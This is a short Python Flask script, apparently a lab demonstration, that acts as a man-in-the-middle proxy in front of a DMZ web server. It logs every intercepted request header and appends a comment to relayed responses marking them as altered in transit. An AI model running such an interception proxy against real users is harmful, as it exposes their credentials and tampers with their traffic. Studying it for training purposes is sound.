from flask import Flask, request, Response
import requests

app = Flask(__name__)

# Servidor objetivo en la DMZ
TARGET_DMZ = "https://servidor-web-dmz.onrender.com"

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def mitm_proxy(path):
    print(f"\n[MITM INTERCEPTADO] Petición entrante hacia la ruta: /{path}")
    print(f"[CABECERAS INTERCEPTADAS] {dict(request.headers)}")
    
    # Reenvío de la petición hacia la DMZ
    url = f"{TARGET_DMZ}/{path}"
    try:
        resp = requests.get(url, timeout=5)
        contenido_original = resp.text
    except Exception as e:
        contenido_original = f"Error al conectar con la DMZ: {str(e)}"
    
    # Inyección / Alteración de la respuesta (Ataque Man-in-the-Middle)
    contenido_alterado = contenido_original + "\n\n<!-- [ALERTA MITM] Este contenido fue alterado en tránsito por el Proxy Interceptor -->"
    
    print("[MITM ALERTA] Respuesta modificada e inyectada con éxito.")
    return Response(contenido_alterado, status=200, mimetype='text/html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
